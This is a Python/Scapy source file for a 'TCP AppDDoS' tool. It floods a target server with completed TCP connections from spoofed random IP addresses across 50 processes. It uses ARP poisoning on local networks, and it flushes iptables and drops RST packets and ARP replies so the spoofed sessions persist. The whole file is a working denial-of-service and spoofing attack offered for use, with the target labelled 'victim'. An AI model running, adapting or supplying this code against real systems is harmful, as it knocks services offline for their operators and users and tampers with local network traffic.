#!/usr/bin/python
# This script creates a TCP exhaustion condition. Run at your own risk!!
#

from random import randrange
from optparse import OptionParser
#import multiprocessing
from multiprocessing import Process,Value, Lock
import logging
import os
import time
import sys
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import * 
conf.verb = 0
teststop = False

# Instantiate a test data class
class TestData:
   def __init__(self, dstip, dstport):
	self.dstip = dstip
	self.dstport = dstport

# Manage interface promiscuity. valid states are on or off
def promisc(state):
        ret =  os.system("ip link set " + conf.iface + " promisc " + state)
        if ret == 1:
                print ("You must run this script with root permissions.")

# Drop all ip and ARP firewall rules
def fwCleanup(arpdir):
	print("Exiting traffic generation...")
	promisc("off")
	print("Flushing all firewall rules...")
	os.system("/sbin/iptables --flush")
	os.system(arpdir + " --flush")

#Get the MAC address for the local interface
#Fixed version for Kali 2017.1
def getEthMac(test):
	data = os.popen("/sbin/ifconfig " + test.iface).readlines()
	for line in data:
	  if "ether" in line:
		test.ethmac = line.split("ether ")[1].split()[0]
		if verbose: print ("local ethmac " + test.ethmac)
		return
	print "Error: unable to find Ethernet MAC"
	sys.exit(0)

# If the default route is on the interface selected determine
# the IP. If not, just fill it with zeros
def getDefRoute(test):
  data = os.popen("/sbin/route -n ").readlines()
  for line in data:
    if line.startswith("0.0.0.0") and (test.iface in line):
      test.defgw = line.split()[1]
      return
    else:
      test.defgw = "0.0.0.0"

# Get the IP address of the interface selected
def getDefIP(test):
  data = os.popen("/sbin/ifconfig " + test.iface).readlines()
  for line in data:
    if line.strip().startswith("inet addr"):
      test.localip = line.split(":")[1].split()[0]
      if verbose: print("local ip " + test.localip)
      return

# ARP out for the target MAC address so we know who to spoof later
def getTargetMAC(test):
	if test.local:	
	   frame = srp1(Ether(dst="ff:ff:ff:ff:ff:ff", src=test.ethmac)/ARP(op="who-has", pdst=test.dstip),iface=test.iface)
	else:
	   frame = srp1(Ether(dst="ff:ff:ff:ff:ff:ff", src=test.ethmac)/ARP(op="who-has", pdst=test.defgw),iface=test.iface)
	test.dstmac=frame.hwsrc
	if verbose: print("target mac " + test.dstmac)

# generate a random IP that is not the default GW or source IP
def getRandomIP(test):
	test.srcip = ".".join([test.classa,str(randrange(1,254)),str(randrange(1,254)),str(randrange(1,254))])
	# If the IP generated is local interface or the gateway get another one
        while (test.srcip == test.defgw) or (test.srcip == test.defgw):
		print("Skipping reserved address: %s" % test.srcip)
		test.srcip = ".".join([test.classa,str(randrange(1,254)),str(randrange(1,254)),str(randrange(1,254))])

##############################################################
# Create a spoofed TCP socket and send a payload
def spoofCon(test):
	try:
	    for i in range(test.counter):
		getRandomIP(test)
		if verbose: print("spoofCon to %s from %s" % (test.dstip, test.srcip))
		stseq = randrange(1,50)
	
		# build IP and TCP layers
		ip=IP(flags="DF", src=test.srcip, dst=test.dstip)
                test.srcport = int(str(randrange(1025,65535)))
		TCP_SYN=TCP(sport=test.srcport, dport=test.dstport, flags="S", seq=stseq)

		if test.local:
		   if verbose: print("processing local handshake...")
		   # send an initial SYN to force the target to ARP
 		   # send((ip/TCP_SYN))

		   # build and send an ARP response to poison the target ARP table
           	   if verbose: print("sending ARP poison")
	   	   arppkt = Ether(dst=test.dstmac, src=test.ethmac)/ARP(op="is-at", hwdst=test.dstmac, psrc=test.srcip, pdst=test.dstip)	
	   	   send(arppkt,iface=test.iface)


		# send a TCP SYN and wait for the SYNACK to be returned
        	if verbose: print("sending syn")
		TCP_SYNACK=sr1((ip/TCP_SYN), timeout=5)
		if (TCP_SYNACK == None):
			continue	

		# build and send the ACK to target based on the learned seq number
		my_ack = TCP_SYNACK.seq + 1
		stseq += 1 
		TCP_ACK=TCP(sport=test.srcport, dport=test.dstport, flags="A", seq=stseq, ack=my_ack)
		send(ip/TCP_ACK)

		# if the user opts to send a payload, send it now. Note that the data variable can be
		# changed to send whatever is desired in the socket.
		if test.payload:
           	   payload=("%s\r\n\r\n" % test.payload)
        	else:
           	   payload=("GET /\r\n\r\n")

		TCP_PUSH=TCP(sport=test.srcport, dport=test.dstport, flags="PA", seq=stseq, ack=my_ack)
		send(ip/TCP_PUSH/payload)
		
	    sys.exit(0) 

	except (KeyboardInterrupt):
	    sys.exit(0)

# Terminate all processes and join them to clear memory. No data is
# harmed in the destruction...
def procDestroy(procs):
	for p in procs: p.terminate()
	for p in procs: p.join()


#*************************************************************
# Main
#*************************************************************
# Parse options
usage = "Use -h to see all options.\r\nEx: python appddos.py -d 10.2.0.1 -p 80 -A 8"
parser = OptionParser(usage=usage)
parser.add_option("-c", "--count", type="int", dest="counter", default="99999999", help="Counter for how many messages to send. If not specified, default is flood.")
parser.add_option("-d", "--dest", dest="server", help="Destination server IP. Required field.")
parser.add_option("-i", "--iface", dest="iface", default="eth0", help="Source interface. Default eth0")
parser.add_option("-p", "--port", type="int", dest="port", default="80", help="Destination port. Default 80")
parser.add_option("-P", "--payload", dest="payload", help="Payload to send. Default is an HTTP GET")
parser.add_option("-A", "--classa", dest="classa", help="Class A network to use for spoofed clients. Integer from 1-254. Required field")
parser.add_option("-l", "--local", action="store_true", dest="local", default=False, help="Victim is on local L2 network")
parser.add_option("-v", "--verbose", action="store_true", dest="verbose", default=False, help="Set verbose mode")
(options, args) = parser.parse_args()

if (options.server == None) or (options.classa == None):
   print("Missing required option!\r\n")
   print parser.usage
   exit(0)

# Initialize default values and parse options 
i = 0
promisc("on")
NUMPROCS = 50

# Move options data into a new object for the test run
test = TestData(options.server,options.port)
test.counter = options.counter 
test.payload = options.payload
test.iface = options.iface
test.classa = options.classa
test.local = options.local
test.done = False
if (options.payload == None):
   test.payload = "GET /\r\n\r\n"
else:
   test.payload = options.payload
verbose = options.verbose

# get local environment information
getEthMac(test)
getDefRoute(test)
getDefIP(test)
getTargetMAC(test)

# Describe the test being performed
print("*************************************************************************")
print("* ------->                                                              *")
print("* <-------                                                              *")
print("* ------->                                                              *")
print("* -------> TCP AppDDoS by unregistered436                               *")
print("*************************************************************************")
print("Using local interface " + test.iface)
print("Sending " + str(test.counter) + " messages from spoofed IPs in the Class A network " + str(test.classa))
print("Victim IP is: " + test.dstip)
if test.local: print("Victim is on local L2 network")
if (options.payload == None):
   print("Using default HTTP GET payload")
else:
   print("Using a custom payload")
print("*** Use CTRL-C to exit test early ***")

# Manage firewall rules that will prevent local host from tearing down sessions or 
# un-poisoning the target ARP table
if verbose: print("Dropping ip firewall rules...")
os.system("/sbin/iptables --flush")
if verbose: print("Blocking RST packets to our victim...")
os.system("/sbin/iptables -A OUTPUT -p tcp --tcp-flags RST RST -d " + test.dstip + " -j DROP")
if verbose:
   os.system("/sbin/iptables -L")


# If running on a local network must block ARP replies so local victim doesn't know we
# don't have the class A test network. On BT & Kali you must install arptables and
# change the path below to match

data = os.popen("which arptables").readlines()
if data:
   for line in data:
      arpdir = line.split("\n")[0]
      if verbose: print("arptables path is:" + arpdir)
else:
   print "Error: arptables OS command not found. Please check your path or install arptables"
   sys.exit(0) 

if test.local:
   if verbose: print("Dropping arp firewall rules...")
   os.system(arpdir + " --flush")
   if verbose: print("Blocking ARP replies from local IP to our victim...")
   os.system(arpdir + " -A OUTPUT -d " + test.dstip + " -j DROP")
   if verbose: os.system(arpdir + " -L")

# If the coutner is smaller than the number of threads constant then only
# use a single thread
if test.counter <= NUMPROCS: NUMPROCS = 1

# Divide the number of tests across all procs then
# create the list of procs and input
test.counter = (test.counter / NUMPROCS)
procs = [Process(target=spoofCon, args=(test,)) for q in range(NUMPROCS)]

try:
	# start the procs and join them together so they exit together
	for p in procs: p.start()
	for p in procs: p.join()

except (KeyboardInterrupt):
	print("\r\nCaught interrupt. Exiting, please wait ...")
	procDestroy(procs)
	fwCleanup(arpdir)
	sys.exit(0)	

for p in procs: p.join()
fwCleanup(arpdir)
